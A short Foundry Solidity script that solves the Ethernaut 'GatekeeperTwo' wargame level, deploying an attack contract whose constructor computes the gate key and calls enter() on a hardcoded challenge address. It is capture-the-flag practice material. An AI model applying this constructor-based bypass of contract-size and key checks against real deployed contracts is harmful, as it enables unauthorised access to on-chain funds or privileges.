// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../../src/Ethernaut/GatekeeperTwo.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        new AttackGateKeeperTwo();
        vm.stopBroadcast();
    }
}

interface IGateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeperTwo {
    constructor() {
        address gate = 0xddb9E45Bcb33aC3D5A983613067E9d1722617304;
        unchecked {
            bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
            IGateKeeperTwo(gate).enter(gateKey);
        }
    }
}
